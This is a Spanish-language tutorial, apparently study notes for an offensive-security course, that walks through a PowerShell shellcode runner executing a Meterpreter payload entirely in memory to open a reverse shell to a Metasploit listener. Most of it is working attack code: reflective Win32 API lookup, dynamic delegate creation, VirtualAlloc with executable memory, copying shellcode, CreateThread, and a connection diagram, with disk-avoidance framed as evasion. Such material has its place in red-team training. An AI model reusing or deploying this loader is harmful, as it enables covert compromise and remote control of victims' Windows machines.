🏗️ Arquitectura general

El objetivo es ejecutar shellcode completamente en memoria para obtener una reverse shell, sin tocar el disco. Para lograrlo se necesitan 3 capas:

┌─────────────────────────────────────┐
│  CAPA 1: Encontrar APIs Win32       │  → LookupFunc
│  CAPA 2: Definir tipos de args      │  → getDelegateType  
│  CAPA 3: Ejecutar el shellcode      │  → VirtualAlloc + CreateThread
└─────────────────────────────────────┘

🔍 CAPA 1: LookupFunc — Encontrar funciones Win32 en memoria

El problema es que no podemos usar Add-Type (escribe al disco). Entonces buscamos funciones ya cargadas en ensamblados existentes de .NET.
```
function LookupFunc {
    Param ($moduleName, $functionName)

    # 1. Busca System.dll entre los ensamblados ya cargados
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { 
            $_.GlobalAssemblyCache -And 
            $_.Location.Split('\\')[-1].Equals('System.dll') 
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    # 2. Encuentra todas las instancias de GetProcAddress
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -eq "GetProcAddress") { $tmp += $_ }
    }

    # 3. Usa GetModuleHandle para obtener base de la DLL
    #    y GetProcAddress para obtener la dirección de la función
    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}
```

Flujo interno:
```
System.dll (ya en memoria)
    └── Microsoft.Win32.UnsafeNativeMethods
            ├── GetModuleHandle("kernel32.dll") → 0x7FFD98F90000
            └── GetProcAddress(base, "VirtualAlloc") → 0x7FFD9900A280
```
🧩 CAPA 2: getDelegateType — Definir los argumentos de la función

Tener la dirección de una función no alcanza. .NET necesita saber qué tipos de parámetros recibe y qué devuelve. Esto se hace creando un delegate type dinámicamente en memoria:
```
function getDelegateType {
    Param (
        [Type[]] $func,      # Tipos de los argumentos
        [Type] $delType = [Void]  # Tipo de retorno
    )

    # PASO 1: Crear ensamblado en memoria (NO en disco)
    $type = [AppDomain]::CurrentDomain
        .DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run  # Solo RAM
        )
        .DefineDynamicModule('InMemoryModule', $false)
        .DefineType('MyDelegateType', 
            'Class, Public, Sealed, AnsiClass, AutoClass', 
            [System.MulticastDelegate])  # Hereda de MulticastDelegate

    # PASO 2: Definir el constructor con los tipos de argumentos
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')

    # PASO 3: Definir el método Invoke con el tipo de retorno
    $type.DefineMethod('Invoke', 
        'Public, HideBySig, NewSlot, Virtual', 
        $delType, 
        $func
    ).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()  # Instanciar el tipo
}
```
Visualmente:
```
getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr])
                 ↑ argumentos de VirtualAlloc            ↑ lo que devuelve
```

🚀 CAPA 3: Construcción de la Reverse Shell paso a paso
Paso 1 — VirtualAlloc: Reservar memoria ejecutable

```
$lpMem = [System.Runtime.InteropServices.Marshal]::
    GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll VirtualAlloc),          # Dirección de VirtualAlloc
        (getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr]))
    ).Invoke(
        [IntPtr]::Zero,  # Dirección: el SO elige
        0x1000,          # Tamaño: 4096 bytes
        0x3000,          # MEM_COMMIT | MEM_RESERVE
        0x40             # PAGE_EXECUTE_READWRITE ← ejecutable!
    )
```

```
RAM antes:  [ ... datos ... ]
RAM después: [ ... datos ... | BLOQUE 4KB EJECUTABLE | ... ]
                                      ↑ $lpMem apunta aquí
```

Paso 2 — Copiar el shellcode a esa memoria
```
# El shellcode es el payload de Meterpreter en bytes
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

# Copia byte a byte desde $buf hacia $lpMem
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
```

`$lpMem → [ FC E8 82 00 00 00 ... ] ← Meterpreter shellcode`

Paso 3 — CreateThread: Ejecutar el shellcode en un nuevo hilo

```
$hThread = [System.Runtime.InteropServices.Marshal]::
    GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll CreateThread),
        (getDelegateType @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]) ([IntPtr]))
    ).Invoke(
        [IntPtr]::Zero,   # Atributos de seguridad: default
        0,                # Tamaño de stack: default
        $lpMem,           # ← Apunta al shellcode en memoria
        [IntPtr]::Zero,   # Parámetros del hilo: ninguno
        0,                # Flags: ejecutar inmediatamente
        [IntPtr]::Zero    # ID del hilo: no nos importa
    )
```

Paso 4 — WaitForSingleObject: Mantener PowerShell vivo

```
[System.Runtime.InteropServices.Marshal]::
    GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll WaitForSingleObject),
        (getDelegateType @([IntPtr],[Int32]) ([Int]))
    ).Invoke(
        $hThread,     # Esperar a este hilo
        0xFFFFFFFF    # Timeout: infinito (INFINITE)
    )
```

Sin esto, PowerShell terminaría y mataría el shellcode antes de que conecte.

🔄 Flujo completo de la conexión
Atacante (Kali)                    Víctima (Windows)
┌─────────────────┐                ┌──────────────────────────┐
│  Metasploit     │                │  PowerShell              │
│  escuchando     │                │                          │
│  en :443        │                │  1. VirtualAlloc()       │
│                 │                │     → bloque ejecutable  │
│                 │                │                          │
│                 │                │  2. Copy(shellcode)      │
│                 │                │     → shellcode en RAM   │
│                 │                │                          │
│                 │◄───────────────│  3. CreateThread()       │
│  ¡Conexión!     │   HTTPS/443    │     → shellcode corre    │
│  Meterpreter    │────────────────►│                          │
│  session 1      │   stage payload│  4. WaitForSingleObject  │
└─────────────────┘                └──────────────────────────┘
